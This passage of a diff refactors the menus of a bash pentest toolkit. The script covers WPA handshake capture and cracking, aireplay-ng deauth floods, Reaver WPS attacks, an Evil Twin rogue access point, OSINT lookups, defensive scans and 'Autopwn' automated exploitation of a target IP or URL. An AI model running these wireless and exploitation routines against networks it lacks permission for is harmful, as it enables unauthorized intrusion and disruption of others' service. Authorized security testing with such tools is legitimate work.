+6) Create fake access point (Evil Twin)
+7) Monitor mode management
+8) WiFi Brute Forcer (WPA/WPA2)
+0) Back to Main Menu"
         
-        echo "1) Scan for wireless networks"
-        echo "2) Capture WPA/WPA2 handshake"
-        echo "3) Crack WPA/WPA2 handshake"
-        echo "4) WPS PIN attack (Reaver)"
-        echo "5) Deauth attack"
-        echo "6) Create fake access point (Evil Twin)"
-        echo "7) Monitor mode management"
-        echo "8) WiFi Brute Forcer (WPA/WPA2)"
-        echo "0) Back to Main Menu"
-        echo ""
-        echo -n "Select option: "
-        read wifi_choice
+        local wifi_choice=$(read_input "Select option: " 1 2 "WiFi Attacks")
         
         case $wifi_choice in
             1) wifi_scan ;;
@@ -1899,23 +2383,22 @@ EOF
 
 # Scan for wireless networks
 wifi_scan() {
-    echo -e "${BLUE}[*] Wireless Network Scanner${NC}"
+    show_menu "Wireless Network Scanner" "Scan for nearby WiFi networks"
     
     # Check for wireless interfaces
     local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
     
     if [[ -z "$iface" ]]; then
         echo -e "${RED}[!] No wireless interface found${NC}"
-        echo -n "Enter interface manually (e.g., wlan0): "
-        read iface
+        local iface=$(read_input "Enter interface manually (e.g., wlan0): " 1 2 "WiFi Scan")
     else
         echo -e "${GREEN}[+] Found wireless interface: $iface${NC}"
     fi
     
     [[ -z "$iface" ]] && return
+    [[ "$iface" == "99" ]] && return
     
-    echo -n "Put interface in monitor mode? (y/n): "
-    read enable_monitor
+    local enable_monitor=$(read_input "Put interface in monitor mode? (y/n): " 2 2 "WiFi Scan")
     
     if [[ "$enable_monitor" == "y" ]]; then
         airmon-ng check kill 2>/dev/null
@@ -1951,21 +2434,22 @@ wifi_scan() {
 
 # Capture WPA/WPA2 handshake
 capture_handshake() {
-    echo -e "${BLUE}[*] WPA/WPA2 Handshake Capture${NC}"
+    show_menu "WPA/WPA2 Handshake Capture" "Capture wireless handshakes for cracking"
     
     local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
-    [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
-    
+    [[ -z "$iface" ]] && local iface=$(read_input "Enter interface: " 1 4 "Handshake")
     [[ -z "$iface" ]] && return
+    [[ "$iface" == "99" ]] && return
     
-    echo -n "Enter target BSSID: "
-    read target_bssid
+    local target_bssid=$(read_input "Enter target BSSID: " 2 4 "Handshake")
     [[ -z "$target_bssid" ]] && return
+    [[ "$target_bssid" == "99" ]] && return
     
-    echo -n "Enter target channel: "
-    read target_channel
-    echo -n "Enter output filename (default: handshake): "
-    read output_name
+    local target_channel=$(read_input "Enter target channel: " 3 4 "Handshake")
+    [[ "$target_channel" == "99" ]] && return
+    
+    local output_name=$(read_input "Enter output filename (default: handshake): " 4 4 "Handshake")
+    [[ "$output_name" == "99" ]] && return
     output_name=${output_name:-handshake}
     
     timestamp=$(date +%Y%m%d_%H%M%S)
@@ -1979,12 +2463,11 @@ capture_handshake() {
     local capture_pid=$!
     
     echo ""
-    echo -n "Send deauth packets to force handshake? (y/n): "
-    read send_deauth
+    local send_deauth=$(read_input "Send deauth packets to force handshake? (y/n): " 5 5 "Handshake")
     
     if [[ "$send_deauth" == "y" ]]; then
-        echo -n "Number of deauth packets (default: 10): "
-        read deauth_count
+        local deauth_count=$(read_input "Number of deauth packets (default: 10): " 6 6 "Handshake")
+        [[ "$deauth_count" == "99" ]] && return
         deauth_count=${deauth_count:-10}
         
         aireplay-ng -0 "$deauth_count" -a "$target_bssid" "$iface" 2>/dev/null
@@ -2006,34 +2489,32 @@ capture_handshake() {
 
 # Crack captured handshake
 crack_handshake() {
-    echo -e "${BLUE}[*] WPA/WPA2 Handshake Cracker${NC}"
+    show_menu "WPA/WPA2 Handshake Cracker" "Crack captured wireless handshakes"
     
-    echo -n "Enter path to .cap file: "
-    read cap_file
-    
+    local cap_file=$(read_input "Enter path to .cap file: " 1 3 "Crack Handshake")
     [[ -z "$cap_file" ]] && return
+    [[ "$cap_file" == "99" ]] && return
     
     if [[ ! -f "$cap_file" ]]; then
         echo -e "${RED}[!] File not found${NC}"
         return
     fi
     
-    echo "Select wordlist:"
-    echo "1) rockyou.txt"
-    echo "2) SecLists common passwords"
-    echo "3) Custom wordlist"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read wordlist_choice
+    show_menu "Wordlist Selection" "1) rockyou.txt
+2) SecLists common passwords
+3) Custom wordlist
+0) Back to main menu"
     
+    local wordlist_choice=$(read_input "Choice: " 2 3 "Crack Handshake")
     [[ "$wordlist_choice" == "0" ]] && return
+    [[ "$wordlist_choice" == "99" ]] && return
     
     case $wordlist_choice in
         1) wordlist="$WORDLISTS_DIR/rockyou.txt" ;;
         2) wordlist="$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
         3) 
-            echo -n "Enter wordlist path: "
-            read wordlist
+            local wordlist=$(read_input "Enter wordlist path: " 3 3 "Crack Handshake")
+            [[ "$wordlist" == "99" ]] && return
             ;;
     esac
     
@@ -2051,16 +2532,14 @@ crack_handshake() {
 
 # WiFi Brute Forcer - Automated WPA/WPA2 cracking
 wifi_brute_forcer() {
-    echo -e "${BLUE}[*] WiFi Brute Forcer${NC}"
-    echo -e "${YELLOW}[*] Automated WPA/WPA2 password cracking${NC}"
-    echo ""
+    show_menu "WiFi Brute Forcer" "Automated WPA/WPA2 password cracking"
     
     local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
-    [[ -z "$iface" ]] && { echo -n "Enter wireless interface: "; read iface; }
+    [[ -z "$iface" ]] && local iface=$(read_input "Enter wireless interface: " 1 8 "WiFi Brute")
     [[ -z "$iface" ]] && return
+    [[ "$iface" == "99" ]] && return
     
-    echo -n "Enable monitor mode? (y/n): "
-    read enable_mon
+    local enable_mon=$(read_input "Enable monitor mode? (y/n): " 2 8 "WiFi Brute")
     if [[ "$enable_mon" == "y" ]]; then
         airmon-ng check kill 2>/dev/null
         airmon-ng start "$iface" 2>/dev/null
@@ -2086,10 +2565,9 @@ wifi_brute_forcer() {
     
     echo ""
     echo "0) Back to main menu"
-    echo -n "Select target: "
-    read target_choice
-    
+    local target_choice=$(read_input "Select target: " 3 8 "WiFi Brute")
     [[ "$target_choice" == "0" ]] && return
+    [[ "$target_choice" == "99" ]] && return
     [[ $target_choice -gt ${#targets[@]} ]] && echo -e "${RED}Invalid selection${NC}" && return
     
     local selected="${targets[$((target_choice-1))]}"
@@ -2098,22 +2576,21 @@ wifi_brute_forcer() {
     local target_ssid=$(echo "$selected" | cut -d'|' -f3)
     
     echo ""
-    echo "Select wordlist:"
-    echo "1) rockyou.txt ($(wc -l < "$WORDLISTS_DIR/rockyou.txt" 2>/dev/null || echo "unknown") words)"
-    echo "2) SecLists top 100k"
-    echo "3) Custom wordlist"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read wordlist_choice
+    show_menu "Wordlist Selection" "1) rockyou.txt ($(wc -l < "$WORDLISTS_DIR/rockyou.txt" 2>/dev/null || echo "unknown") words)
+2) SecLists top 100k
+3) Custom wordlist
+0) Back to main menu"
     
+    local wordlist_choice=$(read_input "Choice: " 4 8 "WiFi Brute")
     [[ "$wordlist_choice" == "0" ]] && return
+    [[ "$wordlist_choice" == "99" ]] && return
     
     case $wordlist_choice in
         1) wordlist="$WORDLISTS_DIR/rockyou.txt" ;;
         2) wordlist="$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
         3) 
-            echo -n "Enter wordlist path: "
-            read wordlist
+            local wordlist=$(read_input "Enter wordlist path: " 5 8 "WiFi Brute")
+            [[ "$wordlist" == "99" ]] && return
             ;;
     esac
     
@@ -2125,8 +2602,7 @@ wifi_brute_forcer() {
     echo "  Channel: $target_channel"
     echo "  Wordlist: $wordlist ($(wc -l < "$wordlist") words)"
     echo ""
-    echo -n "Start brute force attack? (y/n): "
-    read confirm
+    local confirm=$(read_input "Start brute force attack? (y/n): " 6 6 "WiFi Brute")
     
     [[ "$confirm" != "y" ]] && return
     
@@ -2160,15 +2636,17 @@ wifi_brute_forcer() {
 # WPS PIN attack
 wps_attack() {
     check_install reaver
-    echo -e "${BLUE}[*] WPS PIN Attack (Reaver)${NC}"
+    
+    show_menu "WPS PIN Attack (Reaver)" "Attack WiFi Protected Setup PIN"
     
     local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
-    [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
+    [[ -z "$iface" ]] && local iface=$(read_input "Enter interface: " 1 2 "WPS Attack")
     [[ -z "$iface" ]] && return
+    [[ "$iface" == "99" ]] && return
     
-    echo -n "Enter target BSSID: "
-    read target_bssid
+    local target_bssid=$(read_input "Enter target BSSID: " 2 2 "WPS Attack")
     [[ -z "$target_bssid" ]] && return
+    [[ "$target_bssid" == "99" ]] && return
     
     echo -e "${YELLOW}[*] Starting WPS PIN attack...${NC}"
     echo -e "${YELLOW}[*] This may take several hours${NC}"
@@ -2181,25 +2659,26 @@ wps_attack() {
 
 # Deauthentication attack
 deauth_attack() {
-    echo -e "${BLUE}[*] Deauthentication Attack${NC}"
+    show_menu "Deauthentication Attack" "Disconnect clients from WiFi networks"
     
     local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
-    [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
+    [[ -z "$iface" ]] && local iface=$(read_input "Enter interface: " 1 4 "Deauth")
     [[ -z "$iface" ]] && return
+    [[ "$iface" == "99" ]] && return
     
-    echo -n "Enter target BSSID (AP): "
-    read target_bssid
+    local target_bssid=$(read_input "Enter target BSSID (AP): " 2 4 "Deauth")
     [[ -z "$target_bssid" ]] && return
+    [[ "$target_bssid" == "99" ]] && return
     
-    echo -n "Enter target client MAC (or FF:FF:FF:FF:FF:FF for broadcast): "
-    read client_mac
+    local client_mac=$(read_input "Enter target client MAC (or FF:FF:FF:FF:FF:FF for broadcast): " 3 4 "Deauth")
+    [[ "$client_mac" == "99" ]] && return
     client_mac=${client_mac:-FF:FF:FF:FF:FF:FF}
-    echo -n "Number of packets (0=infinite): "
-    read packet_count
+    
+    local packet_count=$(read_input "Number of packets (0=infinite): " 4 4 "Deauth")
+    [[ "$packet_count" == "99" ]] && return
     
     echo -e "${RED}[!] WARNING: Only use on networks you own!${NC}"
-    echo -n "Continue? (y/n): "
-    read confirm
+    local confirm=$(read_input "Continue? (y/n): " 5 5 "Deauth")
     
     if [[ "$confirm" == "y" ]]; then
         echo -e "${YELLOW}[*] Sending deauth packets...${NC}"
@@ -2215,15 +2694,17 @@ evil_twin() {
     check_install hostapd
     check_install dnsmasq
     
-    echo -e "${BLUE}[*] Evil Twin Access Point${NC}"
-    echo -n "Enter interface for AP (e.g., wlan0): "
-    read ap_iface
-    [[ -z "$ap_iface" ]] && return
+    show_menu "Evil Twin Access Point" "Create a rogue access point"
     
-    echo -n "Enter SSID name: "
-    read ssid_name
-    echo -n "Enter channel (1-14): "
-    read channel
+    local ap_iface=$(read_input "Enter interface for AP (e.g., wlan0): " 1 4 "Evil Twin")
+    [[ -z "$ap_iface" ]] && return
+    [[ "$ap_iface" == "99" ]] && return
+    
+    local ssid_name=$(read_input "Enter SSID name: " 2 4 "Evil Twin")
+    [[ "$ssid_name" == "99" ]] && return
+    
+    local channel=$(read_input "Enter channel (1-14): " 3 4 "Evil Twin")
+    [[ "$channel" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local evil_dir="$RESULTS_DIR/wifi/eviltwin_$timestamp"
@@ -2282,7 +2763,7 @@ EOF
 
 # Monitor mode management
 monitor_mode_menu() {
-    echo -e "${BLUE}[*] Monitor Mode Management${NC}"
+    show_menu "Monitor Mode Management" "Manage wireless interface monitor mode"
     
     local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
     
@@ -2290,36 +2771,36 @@ monitor_mode_menu() {
     iw dev 2>/dev/null | grep Interface | awk '{print "  - " $2}'
     echo ""
     
-    echo "1) Enable monitor mode"
-    echo "2) Disable monitor mode"
-    echo "3) Change MAC address"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read mon_choice
+    show_menu "Monitor Mode Options" "1) Enable monitor mode
+2) Disable monitor mode
+3) Change MAC address
+0) Back to main menu"
+    
+    local mon_choice=$(read_input "Choice: " 1 2 "Monitor Mode")
     
     case $mon_choice in
         1)
-            echo -n "Enter interface: "
-            read iface
+            local iface=$(read_input "Enter interface: " 2 2 "Monitor Mode")
             [[ -z "$iface" ]] && return
+            [[ "$iface" == "99" ]] && return
             echo -e "${YELLOW}[*] Enabling monitor mode on $iface...${NC}"
             airmon-ng check kill 2>/dev/null
             airmon-ng start "$iface"
             ;;
         2)
-            echo -n "Enter interface (e.g., wlan0mon): "
-            read iface
+            local iface=$(read_input "Enter interface (e.g., wlan0mon): " 2 2 "Monitor Mode")
             [[ -z "$iface" ]] && return
+            [[ "$iface" == "99" ]] && return
             echo -e "${YELLOW}[*] Disabling monitor mode...${NC}"
             airmon-ng stop "$iface"
             service NetworkManager restart 2>/dev/null || service networking restart 2>/dev/null
             ;;
         3)
-            echo -n "Enter interface: "
-            read iface
+            local iface=$(read_input "Enter interface: " 2 2 "Monitor Mode")
             [[ -z "$iface" ]] && return
-            echo -n "Enter new MAC (or 'random'): "
-            read new_mac
+            [[ "$iface" == "99" ]] && return
+            local new_mac=$(read_input "Enter new MAC (or 'random'): " 3 3 "Monitor Mode")
+            [[ "$new_mac" == "99" ]] && return
             
             if [[ "$new_mac" == "random" ]]; then
                 macchanger -r "$iface"
@@ -2339,26 +2820,17 @@ monitor_mode_menu() {
 
 osint_menu() {
     while true; do
-        echo -e "${CYAN}"
-        cat << "EOF"
-    ╔═══════════════════════════════════════════════════════════╗
-    ║              OSINT & RECONNAISSANCE                       ║
-    ╚═══════════════════════════════════════════════════════════╝
-EOF
-        echo -e "${NC}"
+        show_menu "OSINT & Reconnaissance" "1) Domain Information Gathering
+2) Email OSINT (theHarvester)
+3) Social Media Reconnaissance
+4) Metadata Extraction
+5) Shodan Search
+6) DNS Enumeration
+7) WHOIS Lookup
+8) Full OSINT Report (All Tools)
+0) Back to Main Menu"
         
-        echo "1) Domain Information Gathering"
-        echo "2) Email OSINT (theHarvester)"
-        echo "3) Social Media Reconnaissance"
-        echo "4) Metadata Extraction"
-        echo "5) Shodan Search (API key Required)"
-        echo "6) DNS Enumeration"
-        echo "7) WHOIS Lookup"
-        echo "8) Full OSINT Report (All Tools)"
-        echo "0) Back to Main Menu"
-        echo ""
-        echo -n "Select option: "
-        read osint_choice
+        local osint_choice=$(read_input "Select option: " 1 2 "OSINT Menu")
         
         case $osint_choice in
             1) domain_osint ;;
@@ -2376,11 +2848,11 @@ EOF
 }
 
 domain_osint() {
-    echo -e "${BLUE}[*] Domain Information Gathering${NC}"
-    echo -n "Enter domain: "
-    read domain
+    show_menu "Domain Information Gathering" "Gather comprehensive domain intelligence"
     
+    local domain=$(read_input "Enter domain: " 1 2 "Domain OSINT")
     [[ -z "$domain" ]] && return
+    [[ "$domain" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_dir="$OSINT_DIR/domain_$domain_$timestamp"
@@ -2421,11 +2893,12 @@ domain_osint() {
 
 email_osint() {
     check_install theharvester
-    echo -e "${BLUE}[*] Email OSINT (theHarvester)${NC}"
-    echo -n "Enter domain to search: "
-    read domain
     
+    show_menu "Email OSINT (theHarvester)" "Harvest email addresses from various sources"
+    
+    local domain=$(read_input "Enter domain to search: " 1 2 "Email OSINT")
     [[ -z "$domain" ]] && return
+    [[ "$domain" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_file="$OSINT_DIR/emails_${domain}_$timestamp.txt"
@@ -2439,11 +2912,11 @@ email_osint() {
 }
 
 social_media_recon() {
-    echo -e "${BLUE}[*] Social Media Reconnaissance${NC}"
-    echo -n "Enter username to search: "
-    read username
+    show_menu "Social Media Reconnaissance" "Search for username across platforms"
     
+    local username=$(read_input "Enter username to search: " 1 2 "Social Media")
     [[ -z "$username" ]] && return
+    [[ "$username" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_file="$OSINT_DIR/social_${username}_$timestamp.txt"
@@ -2484,11 +2957,12 @@ social_media_recon() {
 
 metadata_extraction() {
     check_install exiftool
-    echo -e "${BLUE}[*] Metadata Extraction${NC}"
-    echo -n "Enter file or directory path: "
-    read filepath
     
+    show_menu "Metadata Extraction" "Extract hidden metadata from files"
+    
+    local filepath=$(read_input "Enter file or directory path: " 1 2 "Metadata")
     [[ -z "$filepath" ]] && return
+    [[ "$filepath" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_file="$OSINT_DIR/metadata_$timestamp.txt"
@@ -2508,20 +2982,20 @@ metadata_extraction() {
 }
 
 shodan_search() {
-    echo -e "${BLUE}[*] Shodan Search${NC}"
+    show_menu "Shodan Search" "Search for internet-connected devices"
     
     if ! python3 -c "import shodan" 2>/dev/null; then
         echo -e "${YELLOW}[!] Shodan module not installed. Installing...${NC}"
         pip3 install shodan 2>/dev/null || pip3 install --break-system-packages shodan 2>/dev/null
     fi
     
-    echo -n "Enter Shodan API key: "
-    read -s shodan_key
+    local shodan_key=$(read_input "Enter Shodan API key: " 1 2 "Shodan" && echo "")
+    [[ "$shodan_key" == "99" ]] && return
     echo ""
-    echo -n "Enter search query: "
-    read query
     
+    local query=$(read_input "Enter search query: " 2 2 "Shodan")
     [[ -z "$query" ]] && return
+    [[ "$query" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_file="$OSINT_DIR/shodan_$timestamp.txt"
@@ -2549,11 +3023,11 @@ EOF
 }
 
 dns_enum_osint() {
-    echo -e "${BLUE}[*] DNS Enumeration${NC}"
-    echo -n "Enter domain: "
-    read domain
+    show_menu "DNS Enumeration" "Enumerate DNS records and configurations"
     
+    local domain=$(read_input "Enter domain: " 1 2 "DNS Enum")
     [[ -z "$domain" ]] && return
+    [[ "$domain" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_file="$OSINT_DIR/dns_${domain}_$timestamp.txt"
@@ -2584,11 +3058,11 @@ dns_enum_osint() {
 }
 
 whois_lookup() {
-    echo -e "${BLUE}[*] WHOIS Lookup${NC}"
-    echo -n "Enter domain or IP: "
-    read target
+    show_menu "WHOIS Lookup" "Query domain/IP registration information"
     
+    local target=$(read_input "Enter domain or IP: " 1 2 "WHOIS")
     [[ -z "$target" ]] && return
+    [[ "$target" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_file="$OSINT_DIR/whois_${target}_$timestamp.txt"
@@ -2601,11 +3075,11 @@ whois_lookup() {
 }
 
 full_osint_report() {
-    echo -e "${BLUE}[*] Full OSINT Report${NC}"
-    echo -n "Enter target domain: "
-    read domain
+    show_menu "Full OSINT Report" "Comprehensive intelligence gathering"
     
+    local domain=$(read_input "Enter target domain: " 1 2 "Full OSINT")
     [[ -z "$domain" ]] && return
+    [[ "$domain" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local report_dir="$OSINT_DIR/full_report_${domain}_$timestamp"
@@ -2685,24 +3159,15 @@ EOF
 
 blueteam_menu() {
     while true; do
-        echo -e "${CYAN}"
-        cat << "EOF"
-    ╔═══════════════════════════════════════════════════════════╗
-    ║              BLUE TEAM & DEFENSE                          ║
-    ╚═══════════════════════════════════════════════════════════╝
-EOF
-        echo -e "${NC}"
+        show_menu "Blue Team & Defense" "1) Secure Password Generator
+2) Virus Scan (ClamAV)
+3) Rootkit Detection (rkhunter/chkrootkit)
+4) File Integrity Check
+5) Network Connection Monitor
+6) System Hardening Check
+0) Back to Main Menu"
         
-        echo "1) Secure Password Generator"
-        echo "2) Virus Scan (ClamAV)"
-        echo "3) Rootkit Detection (rkhunter/chkrootkit)"
-        echo "4) File Integrity Check"
-        echo "5) Network Connection Monitor"
-        echo "6) System Hardening Check"
-        echo "0) Back to Main Menu"
-        echo ""
-        echo -n "Select option: "
-        read bt_choice
+        local bt_choice=$(read_input "Select option: " 1 2 "Blue Team")
         
         case $bt_choice in
             1) secure_password_gen ;;
@@ -2718,38 +3183,37 @@ EOF
 }
 
 secure_password_gen() {
-    echo -e "${BLUE}[*] Secure Password Generator${NC}"
+    show_menu "Secure Password Generator" "Generate secure passwords and passphrases"
     
-    echo "1) Generate single password"
-    echo "2) Generate multiple passwords"
-    echo "3) Generate passphrase (diceware style)"
-    echo "4) Check password strength"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read choice
+    show_menu "Password Options" "1) Generate single password
+2) Generate multiple passwords
+3) Generate passphrase (diceware style)
+4) Check password strength
+0) Back to main menu"
     
+    local choice=$(read_input "Choice: " 1 2 "Password Gen")
     [[ "$choice" == "0" ]] && return
+    [[ "$choice" == "99" ]] && return
     
     case $choice in
         1)
-            echo -n "Enter password length (default 16): "
-            read length
+            local length=$(read_input "Enter password length (default 16): " 2 2 "Password Gen")
+            [[ "$length" == "99" ]] && return
             length=${length:-16}
             
             # Generate secure password
             local password=$(openssl rand -base64 48 | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c "$length")
             echo -e "${GREEN}[+] Generated Password: $password${NC}"
             
-            echo -n "Save to file? (y/n): "
-            read save
+            local save=$(read_input "Save to file? (y/n): " 3 3 "Password Gen")
             [[ "$save" == "y" ]] && echo "$password" >> "$RESULTS_DIR/blueteam/generated_passwords.txt" && \
                 echo -e "${GREEN}[+] Saved to generated_passwords.txt${NC}"
             ;;
         2)
-            echo -n "How many passwords? "
-            read count
-            echo -n "Password length? "
-            read length
+            local count=$(read_input "How many passwords? " 2 3 "Password Gen")
+            [[ "$count" == "99" ]] && return
+            local length=$(read_input "Password length? " 3 3 "Password Gen")
+            [[ "$length" == "99" ]] && return
             length=${length:-16}
             
             timestamp=$(date +%Y%m%d_%H%M%S)
@@ -2766,8 +3230,8 @@ secure_password_gen() {
             echo -e "${GREEN}[+] Passwords saved to: $output_file${NC}"
             ;;
         3)
-            echo -n "Number of words in passphrase (default 6): "
-            read words
+            local words=$(read_input "Number of words in passphrase (default 6): " 2 2 "Password Gen")
+            [[ "$words" == "99" ]] && return
             words=${words:-6}
             
             if [[ -f "$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ]]; then
@@ -2815,16 +3279,15 @@ secure_password_gen() {
 virus_scan() {
     check_install clamav clamscan
     
-    echo -e "${BLUE}[*] Virus Scanner (ClamAV)${NC}"
+    show_menu "Virus Scanner (ClamAV)" "Scan for malware and viruses"
     
     # Update virus database
     echo -e "${YELLOW}[*] Updating virus database...${NC}"
     freshclam 2>/dev/null || echo -e "${YELLOW}[!] Could not update database (may need to run freshclam manually)${NC}"
     
-    echo -n "Enter path to scan (file or directory): "
-    read scan_path
-    
+    local scan_path=$(read_input "Enter path to scan (file or directory): " 1 2 "Virus Scan")
     [[ -z "$scan_path" ]] && return
+    [[ "$scan_path" == "99" ]] && return
     
     if [[ ! -e "$scan_path" ]]; then
         echo -e "${RED}[!] Path not found${NC}"
@@ -2852,20 +3315,21 @@ virus_scan() {
 }
 
 rootkit_detection() {
-    echo -e "${BLUE}[*] Rootkit Detection${NC}"
+    show_menu "Rootkit Detection" "Scan for rootkits and backdoors"
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_dir="$RESULTS_DIR/blueteam/rootkit_scan_$timestamp"
     create_dir "$output_dir"
     
-    echo "1) Run rkhunter"
-    echo "2) Run chkrootkit"
-    echo "3) Run both"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read choice
+    show_menu "Rootkit Scanner" "1) Run rkhunter
+2) Run chkrootkit
+3) Run both
+0) Back to main menu"
+    
+    local choice=$(read_input "Choice: " 1 2 "Rootkit Detect")
     
     [[ "$choice" == "0" ]] && return
+    [[ "$choice" == "99" ]] && return
     
     if [[ "$choice" == "1" || "$choice" == "3" ]]; then
         if command -v rkhunter &>/dev/null; then
@@ -2891,25 +3355,24 @@ rootkit_detection() {
 }
 
 file_integrity_check() {
-    echo -e "${BLUE}[*] File Integrity Check${NC}"
+    show_menu "File Integrity Check" "Monitor file changes and integrity"
     
-    echo -n "Enter directory to monitor: "
-    read dir_path
-    
+    local dir_path=$(read_input "Enter directory to monitor: " 1 3 "Integrity Check")
     [[ -z "$dir_path" ]] && return
+    [[ "$dir_path" == "99" ]] && return
     [[ ! -d "$dir_path" ]] && echo -e "${RED}[!] Directory not found${NC}" && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local baseline_file="$RESULTS_DIR/blueteam/baseline_${dir_path//\//_}_$timestamp.txt"
     local current_file="$RESULTS_DIR/blueteam/current_${dir_path//\//_}_$timestamp.txt"
     
-    echo "1) Create baseline"
-    echo "2) Check against existing baseline"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read choice
+    show_menu "Integrity Options" "1) Create baseline
+2) Check against existing baseline
+0) Back to main menu"
     
+    local choice=$(read_input "Choice: " 2 3 "Integrity Check")
     [[ "$choice" == "0" ]] && return
+    [[ "$choice" == "99" ]] && return
     
     if [[ "$choice" == "1" ]]; then
         echo -e "${YELLOW}[*] Creating baseline...${NC}"
@@ -2917,8 +3380,8 @@ file_integrity_check() {
         echo -e "${GREEN}[+] Baseline saved to: $baseline_file${NC}"
         echo "Keep this file secure for future integrity checks."
     elif [[ "$choice" == "2" ]]; then
-        echo -n "Enter baseline file path: "
-        read baseline
+        local baseline=$(read_input "Enter baseline file path: " 3 3 "Integrity Check")
+        [[ "$baseline" == "99" ]] && return
         
         [[ ! -f "$baseline" ]] && echo -e "${RED}[!] Baseline file not found${NC}" && return
         
@@ -2952,17 +3415,17 @@ file_integrity_check() {
 }
 
 network_monitor() {
-    echo -e "${BLUE}[*] Network Connection Monitor${NC}"
+    show_menu "Network Connection Monitor" "Monitor active network connections"
     
-    echo "1) Show active connections"
-    echo "2) Monitor connections in real-time"
-    echo "3) Show listening ports"
-    echo "4) Show established connections"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read choice
+    show_menu "Monitor Options" "1) Show active connections
+2) Monitor connections in real-time
+3) Show listening ports
+4) Show established connections
+0) Back to main menu"
     
+    local choice=$(read_input "Choice: " 1 2 "Network Monitor")
     [[ "$choice" == "0" ]] && return
+    [[ "$choice" == "99" ]] && return
     
     case $choice in
         1)
@@ -2988,7 +3451,7 @@ network_monitor() {
 }
 
 hardening_check() {
-    echo -e "${BLUE}[*] System Hardening Check${NC}"
+    show_menu "System Hardening Check" "Check system security configuration"
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local report_file="$RESULTS_DIR/blueteam/hardening_$timestamp.txt"
@@ -3052,20 +3515,11 @@ hardening_check() {
 # =============================================================================
 
 autopwn_menu() {
-    echo -e "${CYAN}"
-    cat << "EOF"
-    ╔═══════════════════════════════════════════════════════════╗
-    ║              AUTOPWN - AUTOMATED EXPLOITATION             ║
-    ╚═══════════════════════════════════════════════════════════╝
-EOF
-    echo -e "${NC}"
+    show_menu "Autopwn - Automated Exploitation" "1) Autopwn IP Address
+2) Autopwn URL/Domain
+0) Back to Main Menu"
     
-    echo "1) Autopwn IP Address"
-    echo "2) Autopwn URL/Domain"
-    echo "0) Back to Main Menu"
-    echo ""
-    echo -n "Select option: "
-    read choice
+    local choice=$(read_input "Select option: " 1 2 "Autopwn")
     
     case $choice in
         1) autopwn_ip ;;
@@ -3076,11 +3530,11 @@ EOF
 }
 
 autopwn_ip() {
-    echo -e "${BLUE}[*] Autopwn IP Address${NC}"
-    echo -n "Enter target IP: "
-    read target_ip
+    show_menu "Autopwn IP Address" "Automated exploitation against IP addresses"
     
+    local target_ip=$(read_input "Enter target IP: " 1 2 "Autopwn IP")
     [[ -z "$target_ip" ]] && return
+    [[ "$target_ip" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local report_dir="$RESULTS_DIR/autopwn/ip_${target_ip//./_}_$timestamp"
@@ -3088,8 +3542,7 @@ autopwn_ip() {
     
     echo -e "${YELLOW}[*] Starting automated exploitation against $target_ip${NC}"
     echo -e "${RED}[!] WARNING: Only use against systems you own or have permission to test!${NC}"
-    echo -n "Continue? (y/n): "
-    read confirm
+    local confirm=$(read_input "Continue? (y/n): " 2 2 "Autopwn IP")
     [[ "$confirm" != "y" ]] && return
     
     # Step 1: Port Scan
@@ -3191,11 +3644,11 @@ EOF
 }
 
 autopwn_url() {
-    echo -e "${BLUE}[*] Autopwn URL/Domain${NC}"
-    echo -n "Enter target URL (e.g., http://target.com): "
-    read target_url
+    show_menu "Autopwn URL/Domain" "Automated web exploitation"
     
+    local target_url=$(read_input "Enter target URL (e.g., http://target.com): " 1 2 "Autopwn URL")
     [[ -z "$target_url" ]] && return
+    [[ "$target_url" == "99" ]] && return
     
     # Ensure URL has protocol
     [[ ! "$target_url" =~ ^http ]] && target_url="http://$target_url"
@@ -3207,8 +3660,7 @@ autopwn_url() {
     
     echo -e "${YELLOW}[*] Starting automated web exploitation against $target_url${NC}"
     echo -e "${RED}[!] WARNING: Only use against systems you own or have permission to test!${NC}"
-    echo -n "Continue? (y/n): "
-    read confirm
+    local confirm=$(read_input "Continue? (y/n): " 2 2 "Autopwn URL")
     [[ "$confirm" != "y" ]] && return
     
     # Step 1: Initial recon
@@ -3310,24 +3762,15 @@ EOF
 
 info_menu() {
     while true; do
-        echo -e "${CYAN}"
-        cat << "EOF"
-    ╔═══════════════════════════════════════════════════════════╗
-    ║              INFORMATION & HELP                           ║
-    ╚═══════════════════════════════════════════════════════════╝
